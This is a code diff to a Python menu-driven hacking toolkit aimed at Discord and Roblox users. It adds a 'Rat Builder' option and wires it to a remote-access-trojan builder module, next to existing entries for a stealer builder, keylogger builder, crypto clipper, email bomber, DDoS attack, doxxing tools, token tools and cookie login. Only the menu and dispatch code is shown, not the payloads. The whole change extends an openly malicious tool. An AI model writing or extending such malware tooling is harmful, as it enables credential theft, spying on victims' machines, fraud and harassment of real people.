@@ -124,7 +124,7 @@ def run_app():
             from core.modern_ui import ModernUI as _mui
             _d_i = ["[1] Webhook Tools", "[2] Token Tools", "[3] Nitro Generator", "[4] Server Info", "[5] Bot Invite Gen", "[6] Selfbot", "[7] Server Cloner"]
             _o_i = ["[10] Port Scanner", "[11] Whois Lookup", "[12] DNS Lookup", "[14] Dox Tracker", "[15] Dox Creator", "[16] Phone Lookup", "[17] Email Lookup"]
-            _m_i = ["[20] Email Bomber", "[21] Crypto Clipper", "[22] Vuln Scanner", "[23] DDoS Attack", "[24] Stealer Builder", "[25] Keylogger Builder", "[26] IP Grabber"]
+            _m_i = ["[20] Email Bomber", "[21] Crypto Clipper", "[22] Vuln Scanner", "[23] DDoS Attack", "[24] Stealer Builder", "[25] Keylogger Builder", "[26] IP Grabber", "[27] Rat Builder"]
             _g_i = ["[30] Base64 Codec", "[31] System Info", "[32] IP Pinger", "[33] Obfuscator", "[13] Metadata Scan"]
             _r_i = ["[40] User Info", "[41] Cookie Info", "[42] Cookie Login", "[43] Group Info", "[44] Asset DL"]
             _f_i = ["[50] Faker Tools", "[34] Web Cloner", "[35] QR Code Gen"]
@@ -135,7 +135,7 @@ def run_app():
             _mui.render_menu(Colorate, Theme, [("GENERAL", _g_i), ("ROBLOX", _r_i), ("FAKER", _f_i), ("SYSTEM", _s_i)])
         else:
             print(Colorate.Horizontal(_cl["head"], "    [ DISCORD ]              [ OSINT ]                [ MALICIOUS ]"))
-            _d = [("[1] Webhook Tools", "[10] Port Scanner", "[20] Email Bomber"),("[2] Token Tools", "[11] Whois Lookup", "[21] Crypto Clipper"),("[3] Nitro Generator", "[12] DNS Lookup", "[22] Vuln Scanner"),("[4] Server Info", "[14] Dox Tracker", "[23] DDoS Attack"),("[5] Bot Invite Gen", "[15] Dox Creator", "[24] Stealer Builder"), ("[6] Selfbot", "[16] Phone Lookup", "[25] Keylogger Builder"), ("[7] Server Cloner", "[17] Email Lookup", "[26] IP Grabber")]
+            _d = [("[1] Webhook Tools", "[10] Port Scanner", "[20] Email Bomber"),("[2] Token Tools", "[11] Whois Lookup", "[21] Crypto Clipper"),("[3] Nitro Generator", "[12] DNS Lookup", "[22] Vuln Scanner"),("[4] Server Info", "[14] Dox Tracker", "[23] DDoS Attack"),("[5] Bot Invite Gen", "[15] Dox Creator", "[24] Stealer Builder"), ("[6] Selfbot", "[16] Phone Lookup", "[25] Keylogger Builder"), ("[7] Server Cloner", "[17] Email Lookup", "[26] IP Grabber"), ("", "", "[27] Rat Builder")]
             for _r1, _r2, _r3 in _d:
                 def _f(s, w):
                     if not s: return " " * w
@@ -248,13 +248,16 @@ def run_app():
             from modules.malicious import start_brute
             start_brute()
         elif _c == '24':
-            subprocess.run([sys.executable, "modules/builder_gui.py"])
+            subprocess.run([sys.executable, "modules/builder/builder_gui.py"])
         elif _c == '25':
             from modules.keylogger import build_keylogger
             build_keylogger()
         elif _c == '26':
             from modules.malicious import ip_grabber
             ip_grabber()
+        elif _c == '27':
+            from modules.builder.rat_builder import rat_builder_init
+            rat_builder_init()
         elif _c == '30':
             _m, _t = get_inpt("(E/D):").upper(), get_inpt("Text:")
             try: print(Colorate.Horizontal(_cl["head"], f"  Res: {CryptXer.b64_e(_t) if _m == 'E' else CryptXer.b64_d(_t)}"))
